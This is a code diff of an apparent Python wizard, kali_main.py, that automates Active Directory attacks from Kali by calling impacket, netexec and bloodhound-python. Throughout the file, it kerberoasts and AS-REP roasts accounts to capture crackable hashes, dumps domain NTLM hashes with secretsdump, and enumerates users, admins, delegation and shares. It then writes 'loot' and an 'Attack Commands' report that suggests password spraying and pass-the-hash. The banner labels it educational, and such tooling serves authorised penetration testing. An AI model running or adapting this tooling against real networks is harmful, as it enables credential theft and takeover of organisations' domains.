@@ -1,6 +1,5 @@
 """
-kali_main.py - Run AD enumeration remotely from Kali/Linux.
-Uses impacket, bloodhound-python, and netexec — no access to Windows machine needed.
+kali_main.py - Remote AD enumeration from Kali using impacket + netexec + bloodhound-python.
 
 Usage:
     python3 kali_main.py
@@ -9,26 +8,27 @@ Usage:
 import os
 import sys
 import subprocess
-import socket
 import getpass
 import re
+import traceback
 from datetime import datetime
 
 sys.path.insert(0, os.path.dirname(__file__))
-from core.report import generate_all
+from core.parser import Finding
+from core.report import generate_report1_html, generate_report2_html, generate_markdown, ATTACK_TEMPLATES
 
 # ---------------------------------------------------------------------------
 # Colors
 # ---------------------------------------------------------------------------
 class C:
-    RED    = "\033[91m"
-    YELLOW = "\033[93m"
-    GREEN  = "\033[92m"
-    CYAN   = "\033[96m"
-    BOLD   = "\033[1m"
-    RESET  = "\033[0m"
-    DIM    = "\033[2m"
-    MAGENTA= "\033[95m"
+    RED     = "\033[91m"
+    YELLOW  = "\033[93m"
+    GREEN   = "\033[92m"
+    CYAN    = "\033[96m"
+    BOLD    = "\033[1m"
+    RESET   = "\033[0m"
+    DIM     = "\033[2m"
+    MAGENTA = "\033[95m"
 
 def _ok(m):   print(f"  {C.GREEN}[+]{C.RESET} {m}")
 def _info(m): print(f"  {C.CYAN}[*]{C.RESET} {m}")
@@ -47,7 +47,7 @@ BANNER = r"""
  | . \ (_| | | | | |  | | (_| | | | | |
  |_|\_\__,_|_|_| |_|  |_|\__,_|_|_| |_|
 
-     Remote AD Recon from Kali - powered by impacket
+     Remote AD Recon from Kali - powered by impacket + netexec
      For educational use only.
 """
 
@@ -55,24 +55,24 @@ BANNER = r"""
 # Dependency check
 # ---------------------------------------------------------------------------
 REQUIRED_TOOLS = {
-    "bloodhound-python": "pip3 install bloodhound",
+    "bloodhound-python":    "pip3 install bloodhound",
     "impacket-GetUserSPNs": "pip3 install impacket",
-    "impacket-GetNPUsers": "pip3 install impacket",
+    "impacket-GetNPUsers":  "pip3 install impacket",
     "impacket-secretsdump": "pip3 install impacket",
-    "netexec": "sudo apt install netexec",
-    "ldapsearch": "sudo apt install ldap-utils",
+    "impacket-ldapdomaindump": "pip3 install impacket",
+    "netexec":              "sudo apt install netexec",
 }
 
 def check_deps():
     missing = []
     for tool, install in REQUIRED_TOOLS.items():
-        result = subprocess.run(["which", tool], capture_output=True)
-        if result.returncode != 0:
+        r = subprocess.run(["which", tool], capture_output=True)
+        if r.returncode != 0:
             missing.append((tool, install))
     if missing:
-        _warn("Missing tools — install them first:")
+        _warn("Missing tools:")
         for tool, cmd in missing:
-            print(f"    {C.RED}[x]{C.RESET} {tool:<30} {C.DIM}{cmd}{C.RESET}")
+            print(f"    {C.RED}[x]{C.RESET} {tool:<30} {C.DIM}→ {cmd}{C.RESET}")
         print()
     return len(missing) == 0
 
@@ -82,12 +82,12 @@ def check_deps():
 def wizard():
     _section("Setup")
 
-    dc_ip  = input(f"  {C.CYAN}>{C.RESET} DC IP [{C.DIM}192.168.50.10{C.RESET}]: ").strip() or "192.168.50.10"
-    domain = input(f"  {C.CYAN}>{C.RESET} Domain (e.g. force.local): ").strip()
-    user   = input(f"  {C.CYAN}>{C.RESET} Username (e.g. aniken.s): ").strip()
+    dc_ip  = input(f"  {C.CYAN}>{C.RESET} DC IP: ").strip()
+    domain = input(f"  {C.CYAN}>{C.RESET} Domain (e.g. corp.local): ").strip()
+    user   = input(f"  {C.CYAN}>{C.RESET} Username: ").strip()
 
     print(f"\n  Auth type:")
-    print(f"    {C.GREEN}[1]{C.RESET} Password")
+    print(f"    {C.GREEN}[1]{C.RESET} Password  (default)")
     print(f"    {C.GREEN}[2]{C.RESET} NTLM hash")
     choice = input(f"  {C.CYAN}>{C.RESET} Choice [1]: ").strip() or "1"
 
@@ -102,7 +102,8 @@ def wizard():
 
     out_dir = input(f"  {C.CYAN}>{C.RESET} Output directory [{C.DIM}./results{C.RESET}]: ").strip() or "./results"
     os.makedirs(out_dir, exist_ok=True)
-    os.makedirs(os.path.join(out_dir, "raw"), exist_ok=True)
+    raw_dir = os.path.join(out_dir, "raw")
+    os.makedirs(raw_dir, exist_ok=True)
 
     return {
         "dc_ip":    dc_ip,
@@ -111,23 +112,26 @@ def wizard():
         "password": password,
         "ntlm":     ntlm,
         "out_dir":  out_dir,
-        "raw_dir":  os.path.join(out_dir, "raw"),
+        "raw_dir":  raw_dir,
     }
 
 # ---------------------------------------------------------------------------
 # Runner helpers
 # ---------------------------------------------------------------------------
-def _run(cmd, out_file, timeout=300):
-    _info(f"Running: {' '.join(cmd)}")
+def _run(cmd, out_file, timeout=300, cwd=None):
+    _info(f"Running: {' '.join(str(x) for x in cmd)}")
     try:
         result = subprocess.run(
             cmd, capture_output=True, text=True,
-            timeout=timeout, errors="ignore"
+            timeout=timeout, errors="ignore", cwd=cwd
         )
         output = result.stdout + result.stderr
-        with open(out_file, "w") as f:
-            f.write(output)
-        _ok(f"Done -> {out_file}")
+        if output.strip():
+            with open(out_file, "w") as f:
+                f.write(output)
+            _ok(f"Done -> {out_file}")
+        else:
+            _warn(f"No output from {os.path.basename(out_file).replace('.txt','')}")
         return output
     except subprocess.TimeoutExpired:
         _warn(f"Timed out after {timeout}s")
@@ -136,20 +140,123 @@ def _run(cmd, out_file, timeout=300):
         _err(f"Failed: {e}")
         return ""
 
-def _auth_args(cfg):
-    """Build impacket-style auth args."""
+def _nxc_auth(cfg, proto="smb"):
+    base = ["netexec", proto, cfg["dc_ip"]]
+    if cfg["ntlm"]:
+        return base + ["-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1]]
+    return base + ["-u", cfg["user"], "-p", cfg["password"]]
+
+def _imp_auth(cfg):
     if cfg["ntlm"]:
         return [f"{cfg['domain']}/{cfg['user']}", "-hashes", cfg["ntlm"]]
     return [f"{cfg['domain']}/{cfg['user']}:{cfg['password']}"]
 
+def _domain_to_dn(domain):
+    return ",".join(f"DC={p}" for p in domain.split("."))
+
 # ---------------------------------------------------------------------------
-# Individual tool runners
+# Tool runners
 # ---------------------------------------------------------------------------
+def run_ldap_enum(cfg):
+    raw_dir  = cfg["raw_dir"]
+    dump_dir = os.path.join(raw_dir, "ldapdomaindump")
+    os.makedirs(dump_dir, exist_ok=True)
+    output   = ""
+
+    # 1. ldapdomaindump
+    _info("ldapdomaindump — full AD object dump...")
+    if cfg["ntlm"]:
+        ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "--hashes", cfg["ntlm"]]
+    else:
+        ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "-p", cfg["password"]]
+
+    r = subprocess.run(
+        ["impacket-ldapdomaindump"] + ldd_auth + [cfg["dc_ip"], "-o", dump_dir, "--no-html"],
+        capture_output=True, text=True, timeout=120, errors="ignore"
+    )
+    ldd_out = r.stdout + r.stderr
+    output += f"=== LDAPDOMAINDUMP ===\n{ldd_out}\n"
+
+    section_map = {
+        "domain_users.grep":       "DOMAIN USERS",
+        "domain_groups.grep":      "DOMAIN GROUPS",
+        "domain_computers.grep":   "DOMAIN COMPUTERS",
+        "domain_policy.grep":      "PASSWORD POLICY",
+        "domain_trusts.grep":      "DOMAIN TRUSTS",
+        "domain_controllers.grep": "DOMAIN CONTROLLERS",
+    }
+    for fname, sname in section_map.items():
+        fpath = os.path.join(dump_dir, fname)
+        if os.path.exists(fpath):
+            content = open(fpath).read().strip()
+            if content:
+                output += f"\n=== {sname} ===\n{content}\n"
+                _ok(f"Got {sname}")
+
+    # 2. netexec ldap targeted queries
+    _info("netexec ldap — targeted queries...")
+    nxc_queries = {
+        "KERBEROASTABLE USERS":     ["--kerberoasting", os.path.join(raw_dir, "kerberoast_hashes.txt")],
+        "ASREP ROASTABLE USERS":    ["--asreproast",    os.path.join(raw_dir, "asrep_hashes.txt")],
+        "UNCONSTRAINED DELEGATION": ["--trusted-for-delegation"],
+        "ADMIN USERS":              ["--admin-count"],
+        "DOMAIN USERS LIST":        ["--users"],
+    }
+    for sname, flags in nxc_queries.items():
+        r = subprocess.run(
+            _nxc_auth(cfg, "ldap") + flags,
+            capture_output=True, text=True, timeout=30, errors="ignore"
+        )
+        content = (r.stdout + r.stderr).strip()
+        if content:
+            output += f"\n=== {sname} ===\n{content}\n"
+            _ok(f"Got {sname}")
+
+    out_file = os.path.join(raw_dir, "ldap_enum.txt")
+    if output.strip():
+        with open(out_file, "w") as f:
+            f.write(output)
+    return output
+
+
+def run_kerberoast(cfg):
+    out_file = os.path.join(cfg["raw_dir"], "kerberoast.txt")
+    cmd = ["impacket-GetUserSPNs"] + _imp_auth(cfg) + [
+        "-dc-ip", cfg["dc_ip"], "-request",
+        "-outputfile", os.path.join(cfg["raw_dir"], "kerberoast_hashes.txt")
+    ]
+    return _run(cmd, out_file)
+
+
+def run_asrep(cfg):
+    out_file   = os.path.join(cfg["raw_dir"], "asrep.txt")
+    users_file = os.path.join(cfg["raw_dir"], "users.txt")
+
+    # Get user list from netexec
+    r = subprocess.run(
+        _nxc_auth(cfg, "ldap") + ["--users"],
+        capture_output=True, text=True, timeout=30, errors="ignore"
+    )
+    users = re.findall(r"\s{2,}(\w[\w\.\-]+)\s{2,}", r.stdout)
+    if users:
+        with open(users_file, "w") as f:
+            f.write("\n".join(set(users)))
+        _ok(f"Got {len(set(users))} users for AS-REP check")
+
+        cmd = ["impacket-GetNPUsers", f"{cfg['domain']}/",
+               "-usersfile", users_file, "-dc-ip", cfg["dc_ip"],
+               "-format", "hashcat",
+               "-outputfile", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")]
+        return _run(cmd, out_file)
+    else:
+        _warn("Could not get user list for AS-REP — skipping")
+        return ""
+
+
 def run_bloodhound(cfg):
-    _info("Running bloodhound-python (full collection)...")
+    _info("bloodhound-python — full collection (runs from raw_dir so ZIP lands there)...")
     log_file = os.path.join(cfg["raw_dir"], "bloodhound.log")
 
-    # bloodhound-python drops the ZIP in cwd — run it from raw_dir
     cmd = [
         "bloodhound-python",
         "-d", cfg["domain"],
@@ -158,7 +265,6 @@ def run_bloodhound(cfg):
         "-dc", cfg["dc_ip"],
         "-c", "All",
         "--zip",
-        "--dns-tcp",
     ]
     if cfg["ntlm"]:
         cmd += ["--hashes", cfg["ntlm"]]
@@ -168,299 +274,202 @@ def run_bloodhound(cfg):
     _info(f"Running: {' '.join(cmd)}")
     try:
         result = subprocess.run(
-            cmd,
-            capture_output=True, text=True,
+            cmd, capture_output=True, text=True,
             timeout=300, errors="ignore",
-            cwd=cfg["raw_dir"]   # ZIP drops here
+            cwd=cfg["raw_dir"]   # ZIP drops in cwd
         )
         output = result.stdout + result.stderr
         with open(log_file, "w") as f:
             f.write(output)
 
-        # Find the ZIP
         zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
         if zips:
             _ok(f"BloodHound ZIP -> {os.path.join(cfg['raw_dir'], zips[0])}")
         else:
-            _warn("BloodHound ZIP not found — check bloodhound.log for errors")
-            if output:
-                for line in output.splitlines()[-10:]:
+            _warn("No BloodHound ZIP generated. Last output:")
+            for line in output.strip().splitlines()[-8:]:
+                if line.strip():
                     print(f"    {C.DIM}{line}{C.RESET}")
         return output
-    except subprocess.TimeoutExpired:
-        _warn("bloodhound-python timed out")
-        return ""
     except Exception as e:
         _err(f"bloodhound-python failed: {e}")
         return ""
 
 
-def run_kerberoast(cfg):
-    out_file = os.path.join(cfg["raw_dir"], "kerberoast.txt")
-    cmd = ["impacket-GetUserSPNs"] + _auth_args(cfg) + [
-        "-dc-ip", cfg["dc_ip"],
-        "-request", "-outputfile", os.path.join(cfg["raw_dir"], "kerberoast_hashes.txt")
-    ]
-    return _run(cmd, out_file)
-
-
-def run_asrep(cfg):
-    out_file = os.path.join(cfg["raw_dir"], "asrep.txt")
-    # First get user list via ldapsearch
-    users_file = os.path.join(cfg["raw_dir"], "users.txt")
-    _get_users_ldap(cfg, users_file)
-    cmd = ["impacket-GetNPUsers",
-           f"{cfg['domain']}/",
-           "-usersfile", users_file,
-           "-dc-ip", cfg["dc_ip"],
-           "-format", "hashcat",
-           "-outputfile", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")]
-    return _run(cmd, out_file)
-
-
-def _get_users_ldap(cfg, out_file):
-    """Dump user list via netexec for AS-REP roasting."""
-    try:
-        if cfg["ntlm"]:
-            auth = ["-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1]]
-        else:
-            auth = ["-u", cfg["user"], "-p", cfg["password"]]
-
-        result = subprocess.run(
-            ["netexec", "ldap", cfg["dc_ip"]] + auth + ["--users"],
-            capture_output=True, text=True, timeout=30, errors="ignore"
-        )
-        # netexec --users output: lines like "LDAP  ... username  ..."
-        users = re.findall(r"\bLDAP\b.+?\s{2,}(\S+)\s{2,}", result.stdout)
-        if not users:
-            # fallback: grab any word after green/yellow status marker
-            users = re.findall(r"\[\*\]\s+(\S+@\S+|\S+\\\S+|\S+)", result.stdout)
-        with open(out_file, "w") as f:
-            f.write("\n".join(set(users)))
-        _ok(f"Got {len(set(users))} users for AS-REP check")
-    except Exception as e:
-        _warn(f"Could not get user list: {e}")
-
-
-def run_ldap_enum(cfg):
-    """
-    Full LDAP enumeration using:
-    1. impacket-ldapdomaindump  — structured dump of all AD objects
-    2. netexec ldap             — targeted queries (kerberoastable, asrep, etc.)
-    """
-    out_file = os.path.join(cfg["raw_dir"], "ldap_enum.txt")
-    dump_dir = os.path.join(cfg["raw_dir"], "ldapdomaindump")
-    os.makedirs(dump_dir, exist_ok=True)
-
-    output = ""
-
-    # ── impacket-ldapdomaindump ───────────────────────────────────────────
-    _info("Running ldapdomaindump...")
-    if cfg["ntlm"]:
-        ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "--hashes", cfg["ntlm"]]
-    else:
-        ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "-p", cfg["password"]]
-
-    ldd_cmd = ["impacket-ldapdomaindump"] + ldd_auth + [
-        cfg["dc_ip"],
-        "-o", dump_dir,
-        "--no-html",   # save as .json + .grep (text)
-    ]
-    try:
-        result = subprocess.run(ldd_cmd, capture_output=True, text=True, timeout=120, errors="ignore")
-        ldd_out = result.stdout + result.stderr
-        output += f"=== LDAPDOMAINDUMP ===\n{ldd_out}\n"
-
-        # Parse the .grep files into our section format
-        grep_map = {
-            "domain_users.grep":       "DOMAIN USERS",
-            "domain_groups.grep":      "DOMAIN GROUPS",
-            "domain_computers.grep":   "DOMAIN COMPUTERS",
-            "domain_policy.grep":      "PASSWORD POLICY",
-            "domain_trusts.grep":      "DOMAIN TRUSTS",
-            "domain_controllers.grep": "DOMAIN CONTROLLERS",
-        }
-        for fname, section_name in grep_map.items():
-            fpath = os.path.join(dump_dir, fname)
-            if os.path.exists(fpath):
-                with open(fpath) as f:
-                    content = f.read()
-                output += f"\n=== {section_name} ===\n{content}\n"
-                _ok(f"Parsed {fname}")
-    except Exception as e:
-        _warn(f"ldapdomaindump error: {e}")
-
-    # ── netexec ldap targeted queries ────────────────────────────────────
-    _info("Running netexec ldap targeted queries...")
-
-    if cfg["ntlm"]:
-        nxc_auth = ["-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1]]
-    else:
-        nxc_auth = ["-u", cfg["user"], "-p", cfg["password"]]
-
-    nxc_base = ["netexec", "ldap", cfg["dc_ip"]] + nxc_auth
-
-    nxc_queries = {
-        "KERBEROASTABLE USERS": ["--kerberoasting", os.path.join(cfg["raw_dir"], "kerberoast_hashes.txt")],
-        "ASREP ROASTABLE USERS": ["--asreproast", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")],
-        "DOMAIN ADMINS":        ["--groups"],
-        "PASSWORD POLICY":      ["--pass-pol"],
-        "UNCONSTRAINED DELEGATION": ["--trusted-for-delegation"],
-        "ADMIN USERS":          ["--admin-count"],
-    }
-
-    for section_name, flags in nxc_queries.items():
-        try:
-            result = subprocess.run(
-                nxc_base + flags,
-                capture_output=True, text=True, timeout=30, errors="ignore"
-            )
-            section_out = result.stdout + result.stderr
-            output += f"\n=== {section_name} ===\n{section_out}\n"
-            if result.stdout.strip():
-                _ok(f"{section_name} done")
-        except Exception as e:
-            _warn(f"netexec {section_name} failed: {e}")
-
-    with open(out_file, "w") as f:
-        f.write(output)
-    _ok(f"LDAP enum complete -> {out_file}")
-    return output
-
-
 def run_shares(cfg):
-    out_file = os.path.join(cfg["raw_dir"], "shares.txt")
-    if cfg["ntlm"]:
-        cmd = ["netexec", "smb", cfg["dc_ip"],
-               "-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1], "--shares"]
-    else:
-        cmd = ["netexec", "smb", cfg["dc_ip"],
-               "-u", cfg["user"], "-p", cfg["password"], "--shares"]
-    return _run(cmd, out_file, timeout=60)
+    return _run(_nxc_auth(cfg) + ["--shares"],
+                os.path.join(cfg["raw_dir"], "shares.txt"), timeout=60)
 
 
 def run_passpol(cfg):
-    out_file = os.path.join(cfg["raw_dir"], "passpol.txt")
-    if cfg["ntlm"]:
-        cmd = ["netexec", "smb", cfg["dc_ip"],
-               "-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1], "--pass-pol"]
-    else:
-        cmd = ["netexec", "smb", cfg["dc_ip"],
-               "-u", cfg["user"], "-p", cfg["password"], "--pass-pol"]
-    return _run(cmd, out_file, timeout=60)
+    return _run(_nxc_auth(cfg) + ["--pass-pol"],
+                os.path.join(cfg["raw_dir"], "passpol.txt"), timeout=60)
 
 
 def run_secretsdump(cfg):
-    """Only runs if user is admin."""
     out_file = os.path.join(cfg["raw_dir"], "secretsdump.txt")
-    cmd = ["impacket-secretsdump"] + _auth_args(cfg) + [
-        f"@{cfg['dc_ip']}", "-just-dc-ntlm"
-    ]
+    cmd = ["impacket-secretsdump"] + _imp_auth(cfg) + [f"@{cfg['dc_ip']}", "-just-dc-ntlm"]
     return _run(cmd, out_file, timeout=120)
 
-
-def _domain_to_dn(domain):
-    return ",".join(f"DC={p}" for p in domain.split("."))
-
 # ---------------------------------------------------------------------------
-# Parser — extract findings from impacket/ldap output
+# Parser
 # ---------------------------------------------------------------------------
 def parse_results(raw):
-    from core.parser import Finding, SEVERITY_ORDER
     findings = []
+    ldap     = raw.get("ldap_enum", "")
+    kerb     = raw.get("kerberoast", "")
+    asrep    = raw.get("asrep", "")
+    shares   = raw.get("shares", "")
+    passpol  = raw.get("passpol", "")
+    secrets  = raw.get("secretsdump", "")
 
-    ldap = raw.get("ldap_enum", "")
-    kerb = raw.get("kerberoast", "")
-    asrep = raw.get("asrep", "")
-    shares = raw.get("shares", "")
-    passpol = raw.get("passpol", "")
-    secrets = raw.get("secretsdump", "")
-
-    def section(text, header):
+    def get_section(text, header):
         m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL | re.IGNORECASE)
         return m.group(1).strip() if m else ""
 
-    # Kerberoastable
-    kerb_users = re.findall(r"ServicePrincipalName.*?\n.*?(\S+@\S+)", kerb, re.IGNORECASE)
-    spn_users  = re.findall(r"sAMAccountName:\s*(.+)", section(ldap, "KERBEROASTABLE USERS"))
-    all_kerb   = list(set(kerb_users + spn_users))
+    # Kerberoastable — from impacket output AND netexec
+    kerb_users = re.findall(r"\$krb5tgs\$\d+\$\*(\w+)\b", kerb)
+    nxc_kerb   = re.findall(r"(\w[\w\.\-]+)\s.*?MemberOf", get_section(ldap, "KERBEROASTABLE USERS"))
+    all_kerb   = list(dict.fromkeys(kerb_users + nxc_kerb))
     if all_kerb:
         findings.append(Finding("kerberoastable_users", f"Kerberoastable Accounts ({len(all_kerb)} found)",
             "HIGH", "Kerberos", "Accounts with SPNs — request TGS tickets and crack offline.", all_kerb, "impacket"))
 
     # AS-REP roastable
-    asrep_users = re.findall(r"sAMAccountName:\s*(.+)", section(ldap, "ASREP ROASTABLE USERS"))
-    asrep_hashes = re.findall(r"\$krb5asrep\$[^\s]+", asrep)
+    asrep_users = re.findall(r"\$krb5asrep\$\d*\$(\w+)@", asrep)
     if asrep_users:
         findings.append(Finding("asrep_roastable", f"AS-REP Roastable Accounts ({len(asrep_users)} found)",
             "HIGH", "Kerberos", "Pre-auth disabled — hash requestable without credentials.", asrep_users, "impacket"))
 
     # Unconstrained delegation
-    unc_hosts = re.findall(r"sAMAccountName:\s*(.+)", section(ldap, "UNCONSTRAINED DELEGATION"))
-    unc_hosts  = [h for h in unc_hosts if "DC" not in h.upper()]
-    if unc_hosts:
+    unc = re.findall(r"(\S+)\s.*?TrustedForDelegation", get_section(ldap, "UNCONSTRAINED DELEGATION"), re.IGNORECASE)
+    unc = [h for h in unc if "DC" not in h.upper()]
+    if unc:
         findings.append(Finding("unconstrained_delegation", "Unconstrained Delegation (Non-DC)",
-            "CRITICAL", "Delegation", "Coerce DC auth to these hosts -> capture TGT -> DCSync.", unc_hosts, "ldapsearch"))
+            "CRITICAL", "Delegation", "Coerce DC auth -> capture TGT -> DCSync.", unc, "netexec"))
 
-    # Constrained delegation
-    const_hosts = re.findall(r"sAMAccountName:\s*(.+)", section(ldap, "CONSTRAINED DELEGATION"))
-    if const_hosts:
-        findings.append(Finding("constrained_delegation", f"Constrained Delegation ({len(const_hosts)} found)",
-            "HIGH", "Delegation", "S4U2Proxy abuse possible if account is compromised.", const_hosts, "ldapsearch"))
-
-    # Password policy — no lockout
-    if re.search(r"lockoutThreshold:\s*0", passpol + ldap, re.IGNORECASE):
+    # No lockout
+    if re.search(r"Lockout Threshold\s*:\s*0|lockoutThreshold.*0", passpol + ldap, re.IGNORECASE):
         findings.append(Finding("no_lockout", "No Account Lockout Policy",
-            "HIGH", "PasswordPolicy", "Lockout threshold is 0 — spray passwords freely.", ["lockoutThreshold: 0"], "netexec"))
+            "HIGH", "PasswordPolicy", "No lockout — password spray freely.", ["Lockout Threshold: 0"], "netexec"))
 
-    # Hashes from secretsdump
+    # NTLM hashes
     hashes = re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)
     if hashes:
         findings.append(Finding("hashes_found", f"NTLM Hashes Dumped ({len(hashes)} accounts)",
-            "CRITICAL", "CredentialAccess", "Full NTLM hash dump from DC — crack or pass-the-hash.", hashes[:20], "secretsdump"))
+            "CRITICAL", "CredentialAccess", "Full hash dump — crack offline or pass-the-hash.", hashes[:20], "secretsdump"))
 
     # SMB shares
-    interesting = re.findall(r"(SYSVOL|NETLOGON|[A-Z]\$|[a-z]+\$)[^\n]*READ", shares, re.IGNORECASE)
+    interesting = re.findall(r"(SYSVOL|NETLOGON|[\w\-]+)\s+READ", shares, re.IGNORECASE)
+    interesting = list(dict.fromkeys(interesting))
     if interesting:
         findings.append(Finding("smb_shares", f"Readable SMB Shares ({len(interesting)} found)",
-            "MEDIUM", "Enumeration", "Readable shares found — check for sensitive files, scripts, passwords.", interesting, "netexec"))
+            "MEDIUM", "Enumeration", "Check for sensitive files, scripts, and stored credentials.", interesting, "netexec"))
 
     findings.sort(key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(f.severity, 9))
     return findings
 
-
 # ---------------------------------------------------------------------------
 # Loot collector
 # ---------------------------------------------------------------------------
-def collect_loot_kali(raw, cfg):
-    ldap = raw.get("ldap_enum", "")
+def collect_loot(raw, cfg):
+    ldap    = raw.get("ldap_enum", "")
     secrets = raw.get("secretsdump", "")
+    kerb    = raw.get("kerberoast", "")
+    asrep   = raw.get("asrep", "")
 
-    def section(text, header):
+    def get_section(text, header):
         m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL | re.IGNORECASE)
         return m.group(1).strip() if m else ""
 
-    def ldap_attr(text, attr):
-        return list(dict.fromkeys(re.findall(rf"{attr}:\s*(.+)", text)))
+    def grep_attr(text, attr):
+        return list(dict.fromkeys(re.findall(rf"(?i){attr}[:\s]+(\S+)", text)))
 
-    loot = {
-        "domain_users":        ldap_attr(section(ldap, "DOMAIN USERS"), "sAMAccountName"),
-        "domain_admins":       ldap_attr(section(ldap, "DOMAIN ADMINS"), "sAMAccountName"),
-        "domain_computers":    ldap_attr(section(ldap, "DOMAIN COMPUTERS"), "sAMAccountName"),
-        "domain_controllers":  ldap_attr(section(ldap, "DOMAIN CONTROLLERS"), "sAMAccountName"),
-        "kerberoastable":      ldap_attr(section(ldap, "KERBEROASTABLE USERS"), "sAMAccountName"),
-        "asrep_roastable":     ldap_attr(section(ldap, "ASREP ROASTABLE USERS"), "sAMAccountName"),
-        "spns":                ldap_attr(section(ldap, "KERBEROASTABLE USERS"), "servicePrincipalName"),
-        "hashes_found":        re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)[:20],
-        "passwords_found":     [],
-        "password_policy":     ldap_attr(section(ldap, "PASSWORD POLICY"),
-                                         "minPwdLength|lockoutThreshold|pwdHistoryLength|maxPwdAge"),
-        "domain_trusts":       [],
-        "gpos":                ldap_attr(section(ldap, "GPO LIST"), "displayName"),
-        "interesting_files":   [],
+    users_sec = get_section(ldap, "DOMAIN USERS LIST") or get_section(ldap, "DOMAIN USERS")
+    admins_sec = get_section(ldap, "DOMAIN ADMINS") or get_section(ldap, "ADMIN USERS")
+
+    return {
+        "domain_users":       grep_attr(users_sec, "sAMAccountName") or
+                              re.findall(r"\s{2,}(\w[\w\.\-]{2,})\s{2,}", users_sec),
+        "domain_admins":      grep_attr(admins_sec, "sAMAccountName") or
+                              re.findall(r"(\w[\w\.\-]+)\s.*?[Aa]dmin", admins_sec),
+        "domain_computers":   grep_attr(get_section(ldap, "DOMAIN COMPUTERS"), "sAMAccountName"),
+        "domain_controllers": grep_attr(get_section(ldap, "DOMAIN CONTROLLERS"), "sAMAccountName"),
+        "kerberoastable":     re.findall(r"\$krb5tgs\$\d+\$\*(\w+)\b", kerb),
+        "asrep_roastable":    re.findall(r"\$krb5asrep\$\d*\$(\w+)@", asrep),
+        "spns":               re.findall(r"ServicePrincipalName\s*:\s*(\S+)", kerb),
+        "hashes_found":       re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)[:20],
+        "passwords_found":    [],
+        "password_policy":    re.findall(r"((?:Min|Max|Lock)\w+\s*[:\=]\s*\S+)", get_section(ldap, "PASSWORD POLICY") + raw.get("passpol","")),
+        "domain_trusts":      grep_attr(get_section(ldap, "DOMAIN TRUSTS"), "trustPartner"),
+        "gpos":               grep_attr(get_section(ldap, "GPO LIST"), "displayName"),
+        "interesting_files":  [],
     }
-    return loot
 
+# ---------------------------------------------------------------------------
+# Report builder — builds HTML directly without going through core/report
+# ---------------------------------------------------------------------------
+def build_reports(findings, loot, raw, cfg):
+    from core.report import (
+        _summary_bar, _loot_table_html, _finding_card_html,
+        _attack_card_html, _bloodhound_guide_html, HTML_TEMPLATE,
+        _html_escape
+    )
+
+    out_dir = cfg["out_dir"]
+    raw_dir = cfg["raw_dir"]
+    ts      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    meta = (f"Generated: {ts} &nbsp;|&nbsp; "
+            f"Domain: <strong>{_html_escape(cfg['domain'])}</strong> &nbsp;|&nbsp; "
+            f"DC: <strong>{_html_escape(cfg['dc_ip'])}</strong> &nbsp;|&nbsp; "
+            f"User: <strong>{_html_escape(cfg['user'])}</strong>")
+
+    config_for_report = {
+        "target":    {"domain": cfg["domain"], "dc_ip": cfg["dc_ip"]},
+        "auth":      {"username": cfg["user"], "password": cfg["password"], "hash": cfg["ntlm"]},
+        "scope":     {"output_dir": out_dir},
+        "discovery": {"network": {"local_ip": ""}, "user": {"username": cfg["user"]}},
+    }
+
+    # Report 1
+    summary   = _summary_bar(findings)
+    loot_html = _loot_table_html(loot)
+    cards     = "\n".join(_finding_card_html(f) for f in findings)
+
+    body1 = f"<h2>Summary</h2>{summary}\n{loot_html}\n<h2>Findings</h2><p style='color:var(--dim);margin-bottom:16px;'>Click any finding to expand.</p>{cards}"
+    r1_html = HTML_TEMPLATE.format(
+        REPORT_TITLE=_html_escape("Report 1 - Findings & Enumeration"),
+        TIMESTAMP=ts, DOMAIN=_html_escape(cfg["domain"]),
+        DC_IP=_html_escape(cfg["dc_ip"]), USERNAME=_html_escape(cfg["user"]),
+        BODY=body1
+    )
+    r1_path = os.path.join(out_dir, "report1_findings.html")
+    with open(r1_path, "w", encoding="utf-8") as f:
+        f.write(r1_html)
+
+    # Report 2
+    legend = ("<div style='margin-bottom:24px;padding:12px 16px;background:var(--surface);"
+              "border-radius:8px;border:1px solid var(--border);'>"
+              "<strong>Legend:</strong>&nbsp;"
+              "<span style='color:var(--orange);font-weight:700;'>Orange</span> = pre-filled "
+              "&nbsp;|&nbsp; <span style='color:#ff6b6b;'>&lt;PLACEHOLDER&gt;</span> = you fill this in</div>")
+
+    bh_guide     = _bloodhound_guide_html(raw_dir)
+    attack_cards = "\n".join(_attack_card_html(f, config_for_report) for f in findings if f.id in ATTACK_TEMPLATES)
+
+    body2 = f"<h2>BloodHound Data</h2>{bh_guide}<h2>Attack Commands</h2>{legend}{attack_cards}"
+    r2_html = HTML_TEMPLATE.format(
+        REPORT_TITLE=_html_escape("Report 2 - Attack Commands"),
+        TIMESTAMP=ts, DOMAIN=_html_escape(cfg["domain"]),
+        DC_IP=_html_escape(cfg["dc_ip"]), USERNAME=_html_escape(cfg["user"]),
+        BODY=body2
+    )
+    r2_path = os.path.join(out_dir, "report2_attack_commands.html")
+    with open(r2_path, "w", encoding="utf-8") as f:
+        f.write(r2_html)
+
+    return r1_path, r2_path
 
 # ---------------------------------------------------------------------------
 # Main
@@ -469,8 +478,7 @@ def main():
     print(C.RED + BANNER + C.RESET)
 
     _section("Dependency Check")
-    if not check_deps():
